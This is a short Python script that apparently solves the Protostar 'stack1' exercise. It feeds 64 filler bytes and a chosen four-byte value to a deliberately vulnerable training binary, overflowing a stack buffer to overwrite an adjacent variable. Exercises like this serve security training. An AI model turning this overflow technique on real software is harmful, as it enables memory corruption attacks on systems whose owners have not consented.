#!/usr/bin/python

import commands

buffer = 'A'*64 + '\x64\x63\x62\x61'

command = '/opt/protostar/bin/stack1'
line = command + " " + buffer

output = commands.getoutput(line)
print(output)
